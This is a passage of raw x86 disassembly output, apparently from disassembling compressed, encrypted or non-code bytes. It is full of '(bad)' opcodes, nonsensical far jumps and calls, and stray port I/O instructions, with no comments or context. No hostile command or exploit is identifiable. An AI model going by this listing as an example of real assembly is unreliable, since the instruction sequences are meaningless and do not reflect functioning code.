  421d83:	pop    esi
  421d84:	adc    cl,cl
  421d86:	imul   edi,eax,0xd5646e0e
  421d8c:	jno    0x421db8
  421d8e:	test   ah,cl
  421d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d91:	dec    esi
  421d92:	test   al,0x3d
  421d94:	sbb    al,0xd
  421d96:	cwde   
  421d97:	stos   BYTE PTR es:[edi],al
  421d98:	aad    0xba
  421d9a:	adc    al,0xc1
  421d9c:	repz retf 0x4bde
  421da0:	xchg   esi,eax
  421da1:	test   BYTE PTR [esp+ecx*4-0x732ba12d],dl
  421da8:	sbb    al,0x3d
  421daa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dab:	jo     0x421d56
  421dad:	fidiv  WORD PTR [esi+eax*2]
  421db0:	retf   
  421db1:	ins    DWORD PTR es:[edi],dx
  421db2:	push   ebx
  421db3:	sbb    bl,BYTE PTR [edx]
  421db5:	aas    
  421db6:	imul   esp,esp,0x5a75c479
  421dbc:	aam    0xa1
  421dbe:	sbb    BYTE PTR [ebx+0x45],bl
  421dc1:	mov    edx,0xd540b92d
  421dc6:	pop    ds
  421dc7:	aad    0x8a
  421dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dca:	mov    eax,ds:0xfbb09f8e
  421dcf:	push   ebx
  421dd0:	cwde   
  421dd1:	push   es
  421dd2:	xchg   esi,ecx
  421dd4:	pop    ebx
  421dd5:	jle    0x421df2
  421dd7:	sub    esi,DWORD PTR [ecx+ebp*8+0x10]
  421ddb:	mov    dl,0xae
  421ddd:	leave  
  421dde:	or     BYTE PTR [edx+0x204bc3d3],0x53
  421de5:	ret    0xd6b0
  421de8:	jmp    0xad2d:0x44e5e398
  421def:	add    BYTE PTR [ebx+esi*8],0xaa
  421df3:	loope  0x421dc9
  421df5:	popa   
  421df6:	jge    0x421e29
  421df8:	test   al,0xea
  421dfa:	outs   dx,BYTE PTR cs:[esi]
  421dfc:	inc    edi
  421dfd:	jecxz  0x421e11
  421dff:	or     eax,0xada5470
  421e04:	mov    esi,0xac9c6662
  421e09:	add    al,ch
  421e0b:	(bad)  
  421e0d:	enter  0xaddd,0xd0
  421e11:	xchg   ebx,eax
  421e12:	mov    edx,0x478d3c8b
  421e17:	shl    BYTE PTR [esp+ebp*1+0x390d7060],0xcd
  421e1f:	ja     0x421e25
  421e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e22:	push   cs
  421e23:	jmp    0x7f434711
  421e28:	xor    BYTE PTR [esi],ch
  421e2a:	xchg   edx,eax
  421e2b:	ds ss jl 0x421e14
  421e2f:	mov    bl,0x9e
  421e31:	iret   
  421e32:	xor    al,0xb1
  421e34:	dec    eax
  421e35:	jle    0x421e1e
  421e37:	cld    
  421e38:	mov    al,ch
  421e3a:	test   DWORD PTR [edi-0x41],edx
  421e3d:	mov    esi,0xee2c990
  421e42:	jmp    0xf4de6ea7
  421e47:	add    ebx,DWORD PTR [ebx+0x4a]
  421e4a:	jge    0x421e3d
  421e4c:	sbb    DWORD PTR [esi-0x22],esp
  421e4f:	add    ebp,esi
  421e51:	xor    ebp,edx
  421e53:	sub    BYTE PTR [eax+0x43a632bd],0x4e
  421e5a:	lahf   
  421e5b:	mov    ch,0x96
  421e5d:	adc    BYTE PTR [eax-0x46],ch
  421e60:	push   ebp
  421e61:	mov    al,0xd6
  421e63:	test   al,0xc8
  421e65:	lock imul ecx,DWORD PTR [edi+0x17286922],0x35
  421e6d:	push   0x79
  421e6f:	cmp    DWORD PTR [edi+0x30cb1aa9],ebx
  421e75:	fidivr DWORD PTR [ebp+0x3b]
  421e78:	inc    esp
  421e79:	add    al,0x7b
  421e7b:	(bad)  
  421e7c:	jp     0x421e40
  421e7e:	jl     0x421e99
  421e80:	(bad)  
  421e81:	cmp    eax,0xb1fbcd12
  421e86:	dec    ebx
  421e87:	jge    0x421e71
  421e89:	(bad)  ds:0x4d69cff8
  421e8f:	jmp    0x83a89fa4
  421e94:	pop    ds
  421e95:	dec    edx
  421e96:	mov    ds:0x32f15013,al
  421e9b:	arpl   bp,bp
  421e9d:	add    dl,BYTE PTR [eax-0x79]
  421ea0:	pop    eax
  421ea1:	push   esp
  421ea2:	pop    es
  421ea3:	and    edi,0xfffffffb
  421ea6:	cmp    ah,ah
  421ea8:	pop    ecx
  421ea9:	jns    0x421e59
  421eab:	ret    
  421eac:	das    
  421ead:	push   edi
  421eae:	loopne 0x421ec5
  421eb0:	test   al,0x7
  421eb2:	imul   DWORD PTR [esi-0x1d]
  421eb5:	xor    ah,BYTE PTR [ecx]
  421eb7:	pop    esp
  421eb8:	out    0x94,al
  421eba:	jns    0x421eff
  421ebc:	inc    esp
  421ebd:	shr    BYTE PTR [edi-0x6e],cl
  421ec0:	push   ds
  421ec1:	out    0xbd,al
  421ec3:	or     edx,edx
  421ec5:	push   ecx
  421ec6:	dec    ebx
  421ec7:	leave  
  421ec8:	sbb    ecx,DWORD PTR [eax+0x617d485f]
  421ece:	sub    esi,ecx
  421ed0:	in     al,dx
  421ed1:	leave  
  421ed2:	js     0x421edf
  421ed4:	lods   al,BYTE PTR ds:[esi]
  421ed5:	cld    
  421ed6:	cs adc al,0xe3
  421ed9:	retf   
  421eda:	popf   
  421edb:	pushf  
  421edc:	shl    DWORD PTR ds:0x8de0d4b0,cl
  421ee2:	stos   BYTE PTR es:[edi],al
  421ee3:	jle    0x421f44
  421ee5:	das    
  421ee6:	push   0xffffffb6
  421ee8:	push   es
  421ee9:	dec    edi
  421eea:	jb     0x421f11
  421eec:	mov    al,0x2a
  421eee:	sub    eax,0x79777d73
  421ef3:	sbb    edx,ebp
  421ef5:	cmp    ecx,ebx
  421ef7:	mov    esp,esi
  421ef9:	jo     0x421f23
  421efb:	ror    al,1
  421efd:	sub    DWORD PTR [edi],esp
  421eff:	xor    ecx,DWORD PTR [bx+di-0x2c]
  421f03:	jg     0x421f54
  421f05:	div    DWORD PTR ds:[eax+0x146d3c9b]
  421f0c:	push   ss
  421f0d:	inc    esi
  421f0e:	das    
  421f0f:	pop    ds
  421f10:	xchg   ebp,eax
  421f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f12:	sbb    ah,0xf9
  421f15:	mov    al,0xaa
  421f17:	mov    ebx,0xc997e877
  421f1c:	inc    esp
  421f1d:	sub    ecx,DWORD PTR [ebp-0x1181271f]
  421f23:	mov    ecx,0x74b962b
  421f28:	jb     0x421f95
  421f2a:	xor    ebx,esp
  421f2c:	dec    edi
  421f2d:	stos   DWORD PTR es:[edi],eax
  421f2e:	xor    DWORD PTR [eax],esi
  421f30:	jnp    0x421fac
  421f32:	push   es
  421f33:	xchg   edi,eax
  421f34:	(bad)  
  421f35:	fnsave [edx+eax*2]
  421f38:	fdivrp st(3),st
  421f3a:	mov    ebp,0xfe075b7f
  421f3f:	(bad)  
  421f40:	shl    DWORD PTR [eax+esi*1],1
  421f43:	and    esp,DWORD PTR [edx+0x6d835eef]
  421f49:	(bad)  
  421f4b:	out    0x7c,al
  421f4d:	jbe    0x421fbc
  421f4f:	push   cs
  421f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f51:	int    0xd6
  421f53:	test   ch,al
  421f55:	sub    al,BYTE PTR [edx+0x23]
  421f58:	mul    dh
  421f5a:	cmp    eax,0x422508c1
  421f5f:	sub    esp,DWORD PTR [edx-0x7b5db6a8]
  421f65:	jge    0x421f2d
  421f67:	pop    es
  421f68:	call   FWORD PTR [ecx-0xb06c1aa]
  421f6e:	sub    al,dh
  421f70:	out    dx,al
  421f71:	sahf   
  421f72:	popa   
  421f73:	lea    eax,[edi+0x6f85f1c8]
  421f79:	int3   
  421f7a:	clc    
  421f7b:	sub    al,0x8d
  421f7d:	xchg   esi,eax
  421f7e:	in     al,dx
  421f7f:	mov    esi,0xc006fb30
  421f84:	rol    ah,cl
  421f86:	and    ebp,0xfffffff8
  421f89:	sbb    ch,BYTE PTR [eax-0x4f]
  421f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f8d:	jb     0x421fc5
  421f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f90:	aad    0x8f
  421f92:	in     al,0x4f
  421f94:	ficomp DWORD PTR [eax-0x56]
  421f97:	xchg   ebx,eax
  421f98:	push   ecx
  421f99:	out    dx,eax
  421f9a:	das    
  421f9b:	sar    BYTE PTR [esi-0x7b2968bb],0x45
  421fa2:	rol    BYTE PTR [esi],0x90
  421fa5:	scas   eax,DWORD PTR es:[edi]
  421fa6:	outs   dx,DWORD PTR ds:[esi]
  421fa7:	mov    cl,0x35
  421fa9:	lock call DWORD PTR ds:0x897b6bf1
  421fb0:	lock jne 0x421fb4
  421fb3:	aad    0x1c
  421fb5:	mov    cs,WORD PTR [edx]
  421fb7:	push   0xffffffec
  421fb9:	mov    ds:0xa61146c1,eax
  421fbe:	jae    0x421f5d
  421fc0:	fwait
  421fc1:	into   
  421fc2:	in     eax,dx
  421fc3:	or     al,0x4a
  421fc5:	sbb    DWORD PTR [ebx-0x61],esi
  421fc8:	pop    ecx
  421fc9:	(bad)  
  421fca:	rol    BYTE PTR [ebp-0x60],0x6f
  421fce:	(bad)  
  421fcf:	jp     0x422002
  421fd1:	push   0x4d7e9712
  421fd6:	and    DWORD PTR [eax],ecx
  421fd8:	sub    esp,DWORD PTR [edx-0x12]
  421fdb:	pop    edi
  421fdc:	fist   DWORD PTR [eax]
  421fde:	rcl    DWORD PTR [ecx],1
  421fe0:	js     0x42200d
  421fe2:	or     BYTE PTR [esi-0x4dede9a4],cl
  421fe8:	outs   dx,DWORD PTR ds:[esi]
  421fe9:	fcmovne st,st(6)
  421feb:	mov    cl,ah
  421fed:	xchg   ecx,eax
  421fee:	jmp    0x5390:0x1e3ede97
  421ff5:	das    
  421ff6:	mov    esp,0xa44bec3a
  421ffb:	mov    al,ds:0x99ba699
  422000:	(bad)  
  422001:	push   ss
  422002:	shl    DWORD PTR [ebp+0x3a],0x32
  422006:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422007:	mov    ecx,0xd39f876a
  42200c:	(bad)  
  42200d:	aas    
  42200e:	mov    ds:0x43911b6,al
  422013:	ror    cl,1
  422015:	or     al,BYTE PTR [edi-0x28b59649]
  42201b:	jne    0x421fa2
  42201d:	mov    WORD PTR [edi+0x2ead8e45],ds
  422023:	add    dh,BYTE PTR [eax+0x1]
  422026:	jmp    0x24761685
  42202b:	imul   esp,DWORD PTR [eax+0x2c],0x72d4790b
  422032:	dec    ebp
  422033:	inc    BYTE PTR [ecx]
  422035:	or     ebx,esp
  422037:	ret    0x2963
  42203a:	push   eax
  42203b:	sahf   
  42203c:	retf   0x1e29
  42203f:	add    DWORD PTR [esi+0x1f4bd395],0x6e20332c
  422049:	or     esi,esp
  42204b:	ins    BYTE PTR es:[edi],dx
  42204c:	outs   dx,DWORD PTR ds:[esi]
  42204d:	push   eax
  42204e:	mov    eax,0x63ab8193
  422053:	add    BYTE PTR [ecx-0x4e43c4a8],bl
  422059:	xlat   BYTE PTR ds:[ebx]
  42205a:	leave  
  42205b:	cmp    DWORD PTR [eax],0x83ad36a5
  422061:	and    DWORD PTR [ebp-0x5880e14c],edi
  422067:	pop    ds
  422068:	mov    gs,WORD PTR [edi]
  42206a:	push   0x2
  42206c:	xor    BYTE PTR [esi+0x57],bl
  42206f:	retf   
  422070:	xchg   esp,eax
  422071:	in     eax,0xdf
  422073:	fwait
  422074:	pop    es
  422075:	neg    BYTE PTR [ecx+ecx*2+0x6442455]
  42207c:	and    bh,BYTE PTR [esi+0xdf1daab]
  422082:	(bad)  
  422083:	dec    edi
  422084:	or     DWORD PTR [ebx-0x64],esp
  422087:	or     eax,0x1dba47f9
  42208c:	adc    ch,BYTE PTR [esi+0x4a]
  42208f:	dec    ecx
  422090:	mov    ah,0xa9
  422092:	xor    DWORD PTR [ebp+ebp*4+0x4d37a1e9],esp
  422099:	and    al,0x42
  42209b:	(bad)  
  42209c:	cdq    
  42209d:	push   esp
  42209e:	xor    BYTE PTR [esi],0x3
  4220a1:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4220a3:	ret    0xcc4a
  4220a6:	mov    ah,BYTE PTR [ebx-0x48]
  4220a9:	sub    BYTE PTR [ebp-0x59],0xe0
  4220ad:	pop    ss
  4220ae:	int3   
  4220af:	and    al,0xdd
  4220b1:	jmp    DWORD PTR [edx+0x72]
  4220b4:	jo     0x422039
  4220b6:	ins    BYTE PTR es:[edi],dx
  4220b7:	xchg   esi,eax
  4220b8:	aas    
  4220b9:	jno    0x4220e8
  4220bb:	sbb    eax,DWORD PTR [ebp+0x7edf05e3]
  4220c1:	les    edi,FWORD PTR [ebx+edx*8]
  4220c4:	call   0xf6db:0x29dd591
  4220cb:	or     eax,0x34eb6001
  4220d0:	sub    edi,DWORD PTR [ebx-0xf5707b5]
  4220d6:	sti    
  4220d7:	mov    ds:0xd16f1af,eax
  4220dc:	xor    edx,DWORD PTR [esi+0x8]
  4220df:	out    0xd7,eax
  4220e1:	rol    DWORD PTR [ecx+0x65],1
  4220e4:	(bad)  
  4220e5:	dec    ebx
  4220e6:	sub    eax,0xe4079038
  4220eb:	lock add al,BYTE PTR es:0x13ab59e9
  4220f3:	push   ebp
  4220f4:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4220f6:	and    bl,BYTE PTR [ebp-0x5f42819d]
  4220fc:	jle    0x4220d3
  4220fe:	js     0x4220bd
  422100:	push   0xffffffc7
  422102:	repnz push ecx
  422104:	push   ebp
  422105:	ja     0x4220c0
  422107:	mov    BYTE PTR [ebp+0x4],dl
  42210a:	stos   DWORD PTR es:[edi],eax
  42210b:	xlat   BYTE PTR ds:[ebx]
  42210c:	repz repnz pusha 
  42210f:	(bad)  [edx]
  422111:	jle    0x42215a
  422113:	push   0xbd717cd3
  422118:	stos   BYTE PTR es:[edi],al
  422119:	sbb    dl,cl
  42211b:	push   ss
  42211c:	mov    ch,0x94
  42211e:	sub    BYTE PTR [ecx-0xb12bc3f],0x43
  422125:	xchg   ebp,eax
  422126:	or     BYTE PTR ds:0xaad1bb8f,0x5b
  42212d:	jge    0x422101
  42212f:	mov    fs,WORD PTR [ebp+0x685c6830]
  422135:	xor    al,0x19
  422137:	leave  
  422138:	sub    DWORD PTR [esi-0x6d809f33],esi
  42213e:	shl    BYTE PTR [edx],1
  422140:	push   ebp
  422141:	push   eax
  422142:	je     0x42216a
  422144:	dec    edx
  422145:	jnp    0x422194
  422147:	lahf   
  422148:	inc    ebx
  422149:	adc    eax,0x222a0249
  42214e:	outs   dx,BYTE PTR ds:[esi]
  42214f:	push   edi
  422150:	(bad)  
  422151:	pop    ecx
  422152:	push   ss
  422153:	imul   edx,edi,0x562eeb
  422159:	std    
  42215a:	inc    ebx
  42215b:	add    esp,ecx
  42215d:	int    0x10
  42215f:	inc    edi
  422160:	mov    dh,0xc
  422162:	repz fwait
  422164:	and    al,0x13
  422166:	cli    
  422167:	xor    eax,0x414a745d
  42216c:	fstp   QWORD PTR [ebx-0x64f3a2c3]
  422172:	adc    BYTE PTR [esi-0x75],0xa5
  422176:	ins    DWORD PTR es:[edi],dx
  422177:	dec    edi
  422178:	outs   dx,DWORD PTR ds:[esi]
  422179:	dec    edx
  42217a:	imul   ebx,DWORD PTR [esi-0x24],0xffffffa2
  42217e:	retf   
  42217f:	lea    esp,[ebx+eax*8]
  422182:	out    0xb7,eax
  422184:	ja     0x4221fa
  422186:	mov    bl,BYTE PTR [edx-0x32]
  422189:	dec    eax
  42218a:	and    DWORD PTR [ebx-0x45],ebx
  42218d:	mov    ah,0xe8
  42218f:	fisub  WORD PTR [ebx+esi*1+0x7754fd5a]
  422196:	mov    dh,0xa0
  422198:	push   es
  422199:	jne    0x422161
  42219b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42219c:	inc    eax
  42219d:	xor    ebp,DWORD PTR [eax-0x5]
  4221a0:	xor    DWORD PTR [ebp-0x4a],edx
  4221a3:	gs mov ebp,0x2677143
  4221a9:	and    edx,edx
  4221ab:	or     dl,bl
  4221ad:	bound  eax,QWORD PTR [edi+0x58]
  4221b0:	add    DWORD PTR [edx-0xf],edx
  4221b3:	sahf   
  4221b4:	sahf   
  4221b5:	in     eax,0x9
  4221b7:	out    dx,eax
  4221b8:	mov    dh,0x3d
  4221ba:	add    bl,BYTE PTR [edx+0x56]
  4221bd:	and    ebx,DWORD PTR [ecx-0x77ffb63e]
  4221c3:	adc    eax,0xa978e8ea
  4221c8:	xchg   ecx,eax
  4221c9:	aam    0xbb
  4221cb:	mov    ch,0x32
  4221cd:	inc    edx
  4221ce:	sub    BYTE PTR [ebx-0x7e5bba36],dh
  4221d4:	popa   
  4221d5:	enter  0x702f,0x81
  4221d9:	mov    dl,0x42
  4221dc:	inc    ebx
  4221dd:	mov    ch,0x35
  4221df:	repz pop ss
  4221e1:	xor    bh,dh
  4221e3:	jge    0x42220a
  4221e5:	mov    ecx,0x861a730e
  4221ea:	sti    
  4221eb:	dec    ebp
  4221ec:	test   eax,0x7f4c467c
  4221f1:	in     al,dx
  4221f2:	cmc    
  4221f3:	mov    eax,0x5c043fb3
  4221f8:	cmc    
  4221f9:	shl    DWORD PTR [ebx-0x44],0x40
  4221fd:	mov    esi,0x1e3617a6
  422202:	imul   eax,edx,0xe2c00491
  422208:	jno    0x42218b
  42220a:	adc    edi,ebx
  42220c:	cdq    
  42220d:	and    eax,0x37187d6d
  422212:	cld    
  422213:	add    al,0x76
  422215:	dec    eax
  422216:	sbb    bh,bl
  422218:	sbb    DWORD PTR [eax+0x7e],edx
  42221b:	jle    0x422216
  42221d:	cld    
  42221e:	inc    ebx
  42221f:	mov    ch,al
  422221:	(bad)  
  422222:	cmp    DWORD PTR [ecx],ecx
  422224:	mov    ebx,0xaf659b22
  422229:	push   edx
  42222a:	aam    0x37
  42222c:	repz clc 
  42222e:	xor    eax,0x9adf1fdf
  422233:	jl     0x42224c
  422235:	push   edi
  422236:	(bad)  
  422237:	std    
  422238:	inc    esp
  422239:	xchg   esp,eax
  42223a:	repz xor eax,0x923437dc
  422240:	push   cs
  422241:	mov    esp,0xf8ccad1c
  422246:	fbstp  TBYTE PTR [eax]
  422248:	shl    BYTE PTR [eax],1
  42224a:	bnd ja 0x422212
  42224d:	and    BYTE PTR [ebp+0x68],ah
  422250:	xor    DWORD PTR [ebp+0x1afd1aad],ecx
  422256:	jl     0x42225d
  422258:	(bad)  
  422259:	imul   eax,DWORD PTR [ecx+0x28fef2d6],0xffffff8d
  422260:	push   edx
  422261:	outs   dx,BYTE PTR ds:[esi]
  422262:	xor    esi,DWORD PTR [edx]
  422264:	jp     0x422249
  422266:	test   eax,0x7b7e9c40
  42226b:	pop    edx
  42226c:	pop    ebp
  42226d:	mov    bh,0xa
  42226f:	pop    es
  422270:	out    dx,al
  422271:	inc    edi
  422272:	fadd   st(3),st
  422274:	stos   DWORD PTR es:[edi],eax
  422275:	in     eax,dx
  422276:	add    dh,0x23
  422279:	sub    BYTE PTR [edx],0x7c
  42227c:	or     eax,0x148ed8a7
  422281:	pop    eax
  422282:	mov    esi,0x73aaa721
  422287:	xchg   edx,eax
  422288:	xor    edx,DWORD PTR [esi-0x27]
  42228b:	add    edx,eax
  42228d:	cli    
  42228e:	mov    ecx,0xb7979
  422293:	xor    WORD PTR [eax-0x2421ee47],sp
  42229a:	jmp    0x4222f9
  42229c:	enter  0x7957,0xf8
  4222a0:	sub    dh,0x7b
  4222a3:	xchg   BYTE PTR [edi+eiz*8-0x9],dh
  4222a7:	xchg   edx,eax
  4222a8:	cs inc ebp
  4222aa:	mov    esp,0x792185c6
  4222af:	test   BYTE PTR [esi+0x3719e2bd],0xab
  4222b6:	out    dx,eax
  4222b7:	or     ebp,esi
  4222b9:	das    
  4222ba:	and    dh,BYTE PTR [ecx]
  4222bc:	out    dx,al
  4222bd:	mov    bl,0x2d
  4222bf:	js     0x422248
  4222c1:	push   esp
  4222c2:	push   edx
  4222c3:	or     esi,DWORD PTR [edi-0x2d]
  4222c6:	pop    ds
  4222c7:	mov    esi,edx
  4222c9:	ss cmp al,0x28
  4222cc:	popa   
  4222cd:	call   DWORD PTR [edi+ecx*8]
  4222d0:	jae    0x422304
  4222d2:	push   esp
  4222d3:	cmp    BYTE PTR [edi-0x2b],al
  4222d6:	xchg   edx,eax
  4222d7:	dec    esp
  4222d8:	inc    esp
  4222d9:	repnz fs fwait
  4222dc:	mov    esi,0x925a3149
  4222e1:	cmp    al,0x98
  4222e3:	jne    0x4222dc
  4222e5:	xchg   ecx,eax
  4222e6:	shl    BYTE PTR [ecx],0x4f
  4222e9:	inc    edx
  4222ea:	test   dl,al
  4222ec:	jmp    0x47e9:0xe756b393
  4222f3:	mov    ebx,0xa18133ee
  4222f8:	xor    DWORD PTR [eax-0x1880707b],edi
  4222fe:	push   esi
  4222ff:	and    eax,0x50a68a8c
  422304:	outs   dx,DWORD PTR ds:[esi]
  422305:	mov    edi,0x92db6939
  42230a:	pop    esp
  42230b:	sbb    al,0xbe
  42230d:	and    esi,DWORD PTR [edx+0x28edd7a3]
  422313:	mov    bl,0x37
  422315:	xor    dl,BYTE PTR [esi-0x14]
  422318:	push   ds
  422319:	xchg   esp,eax
  42231a:	test   BYTE PTR [esi-0x3e9d2bf3],dl
  422320:	xor    DWORD PTR [ecx],esp
  422322:	cmp    cl,bl
  422324:	mov    BYTE PTR [ebx],bh
  422326:	add    al,0xd1
  422328:	dec    edx
  422329:	mov    BYTE PTR [ebx],ch
  42232b:	and    DWORD PTR [edx-0x22],esi
  42232e:	add    edi,DWORD PTR [esi+0x7e]
  422331:	int3   
  422332:	popa   
  422333:	lods   eax,DWORD PTR ds:[esi]
  422334:	jb     0x4222c6
  422336:	add    esi,DWORD PTR [edi+0x23]
  422339:	xchg   edx,eax
  42233a:	daa    
  42233b:	fst    DWORD PTR [esi-0x38]
  42233e:	leave  
  42233f:	aaa    
  422340:	add    al,0x12
  422342:	mov    ecx,0xd6063537
  422347:	into   
  422348:	ins    BYTE PTR es:[edi],dx
  422349:	pop    eax
  42234a:	dec    ebp
  42234b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42234c:	jns    0x4223c9
  42234e:	jbe    0x4222f0
  422350:	add    eax,0x42cd5698
  422355:	mov    WORD PTR [ebx+0x77],?
  422358:	test   BYTE PTR [edx+eax*8-0x40],bl
  42235c:	sbb    al,dl
  42235e:	hlt    
  42235f:	mov    ebp,0x626969b
  422364:	scas   al,BYTE PTR es:[edi]
  422365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422366:	test   al,0x40
  422368:	mov    ah,BYTE PTR [ebx]
  42236a:	sbb    ecx,DWORD PTR [esi-0x3]
  42236d:	mov    dl,0x1d
  42236f:	(bad)  
  422370:	and    al,0x50
  422372:	nop    DWORD PTR [eax+0x4c0304e2]
  422379:	arpl   si,sp
  42237b:	and    al,0xdc
  42237d:	lods   eax,DWORD PTR ds:[esi]
  42237e:	adc    eax,0x4b44d159
  422383:	sub    cl,BYTE PTR [ebx+0x5d376aa5]
  422389:	dec    edi
  42238a:	fimul  DWORD PTR [edi+edi*4-0x466ae9]
  422391:	pop    edi
  422392:	adc    esp,DWORD PTR [eax-0xd]
  422395:	daa    
  422396:	cmc    
  422397:	lds    edi,FWORD PTR [edi+esi*4-0x7f0d0bbd]
  42239e:	je     0x4223cd
  4223a0:	xchg   ecx,eax
  4223a1:	fstp   QWORD PTR [ebp-0x51028650]
  4223a7:	sub    DWORD PTR [ebx-0x35cbb718],edi
  4223ad:	jg     0x422331
  4223af:	out    0xeb,al
  4223b1:	enter  0x6f90,0x4c
  4223b5:	fcomp  QWORD PTR [ecx+0x1928c658]
  4223bb:	mov    ebp,0x15d7d423
  4223c0:	jno    0x4223ac
  4223c2:	mov    edi,?
  4223c4:	mov    eax,0xbfd7dcba
  4223c9:	pop    ds
  4223ca:	sbb    DWORD PTR [ebx],esp
  4223cc:	adc    eax,0x4396d5b1
  4223d1:	retf   
  4223d2:	call   0x3bca:0x20b759bf
  4223d9:	repz pop esp
  4223db:	into   
  4223dc:	jmp    0x26509416
  4223e1:	dec    ebx
  4223e2:	sbb    esp,DWORD PTR fs:[esi]
  4223e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e6:	cli    
  4223e7:	mov    DWORD PTR [eax-0x5baf5c6b],esi
  4223ed:	pop    edx
  4223ee:	mov    cl,0x4
  4223f0:	test   al,0x74
  4223f2:	fcmove st,st(2)
  4223f4:	in     eax,0xdf
  4223f6:	inc    edi
  4223f7:	push   0x5d
  4223f9:	retf   
  4223fa:	dec    ebx
  4223fb:	in     eax,0x6b
  4223fd:	and    esi,edi
  4223ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422400:	fidivr DWORD PTR [esi+0x27853449]
  422406:	shl    DWORD PTR [edx-0x33bd23e1],cl
  42240c:	(bad)  
  42240d:	or     eax,0x312723c6
  422412:	fcomp  DWORD PTR [ebx]
  422414:	sub    al,0xea
  422416:	nop
  422417:	retf   
  422418:	mov    esi,0x40af3f3b
  42241d:	adc    eax,0xf3a8157a
  422422:	and    al,BYTE PTR [edx]
  422424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422425:	push   esp
  422426:	data16 mov ch,0x6c
  422429:	popf   
  42242a:	inc    esi
  42242b:	sub    bl,BYTE PTR [ebx+0x60fa6a90]
  422431:	mov    ebp,0x2cf8b53d
  422436:	out    dx,eax
  422437:	stos   DWORD PTR es:[edi],eax
  422438:	lahf   
  422439:	inc    ebp
  42243a:	lds    edi,FWORD PTR [ebx-0xe]
  42243d:	cmp    eax,0xa7297318
  422442:	or     eax,0x5e67d043
  422447:	xchg   esp,eax
  422448:	or     eax,0xf20f1d9e
  42244d:	push   esi
  42244e:	dec    eax
  42244f:	push   es
  422450:	mov    eax,0x40360b3
  422455:	xchg   edi,eax
  422456:	das    
  422457:	and    ecx,DWORD PTR [ebx+0x7bae93e4]
  42245d:	mov    ah,0x2e
  42245f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422460:	fisttp DWORD PTR [ebx+ebp*2]
  422463:	sbb    ecx,eax
  422465:	call   0x72a6:0xb7b0eeba
  42246c:	xchg   ebp,eax
  42246d:	mov    ah,0x30
  42246f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422470:	inc    ebx
  422471:	xor    dh,BYTE PTR [ebp-0x3f51e67]
  422477:	jmp    0x6030:0x6708a8c2
  42247e:	ja     0x4224df
  422480:	(bad)  
  422481:	addr16 and ah,cl
  422484:	(bad)  
  422486:	adc    al,0xb4
  422488:	fidivr WORD PTR [eax-0x6a78f6ad]
  42248e:	mov    edx,0x34de1b06
  422493:	mov    ebp,0x5d75275
  422498:	mov    WORD PTR [eax],gs
  42249a:	dec    eax
  42249b:	xchg   edi,eax
  42249c:	xor    ecx,ebx
  42249e:	pmaxub mm5,QWORD PTR [ecx+0x69]
  4224a2:	scas   eax,DWORD PTR es:[edi]
  4224a3:	and    al,0x15
  4224a5:	inc    esp
  4224a6:	je     0x4224b8
  4224a8:	dec    esi
  4224a9:	xchg   esi,eax
  4224aa:	xorps  xmm7,XMMWORD PTR [edx]
  4224ad:	sahf   
  4224ae:	adc    BYTE PTR [ebp+0x6c4247d5],al
  4224b4:	dec    esi
  4224b5:	pop    ebp
  4224b6:	push   ds
  4224b7:	fs push edx
  4224b9:	(bad)  
  4224ba:	(bad)  
  4224bc:	popa   
  4224bd:	test   al,0x2f
  4224bf:	hlt    
  4224c0:	scas   eax,DWORD PTR es:[edi]
  4224c1:	push   ebx
  4224c2:	repz mov ch,0x51
  4224c5:	int    0x68
  4224c7:	pop    es
  4224c8:	mov    ch,BYTE PTR [esi]
  4224ca:	dec    edi
  4224cb:	jnp    0x42246e
  4224cd:	int3   
  4224ce:	ret    0x5ce1
  4224d1:	lahf   
  4224d2:	mov    eax,ds:0xfb2c9043
  4224d7:	inc    esp
  4224d8:	cmp    eax,edi
  4224da:	jo     0x4224f6
  4224dc:	mov    eax,0xaf7af8ec
  4224e1:	adc    eax,0xc647fec6
  4224e6:	mov    edx,0x36850fd4
  4224eb:	aas    
  4224ec:	or     ebp,DWORD PTR [ecx-0x2a]
  4224ef:	mov    al,BYTE PTR [edi-0x4d35751d]
  4224f5:	popa   
  4224f6:	jns    0x4224e9
  4224f8:	xchg   BYTE PTR [eax-0x70477cc3],dl
  4224fe:	rcr    DWORD PTR [eax],1
  422500:	mov    al,ds:0xd4eb852d
  422505:	in     al,0xd9
  422507:	dec    ebp
  422508:	jns    0x422508
  42250a:	cmc    
  42250b:	(bad)  
  42250c:	aam    0x19
  42250e:	ins    DWORD PTR es:[edi],dx
  42250f:	cmp    BYTE PTR [ebp-0x50],0xb1
  422513:	dec    ecx
  422514:	stos   DWORD PTR es:[edi],eax
  422515:	popa   
  422516:	mov    al,ds:0x44ae9dc8
  42251b:	mul    BYTE PTR [edi-0x5]
  42251e:	pop    esi
  42251f:	xchg   ch,dl
  422521:	sahf   
  422522:	lea    ecx,[esi-0x37]
  422525:	cdq    
  422526:	fstp   st(3)
  422528:	dec    edi
  422529:	clc    
  42252a:	hlt    
  42252b:	in     eax,dx
  42252c:	ins    DWORD PTR es:[edi],dx
  42252d:	cmp    BYTE PTR gs:[ebx],ah
  422530:	ret    0x4f9e
  422533:	push   ecx
  422534:	push   ebp
  422535:	call   0xcf4c:0x4e5897c2
  42253c:	and    BYTE PTR [ebx+0x66a729ac],dl
  422542:	dec    edx
  422543:	inc    edi
  422544:	daa    
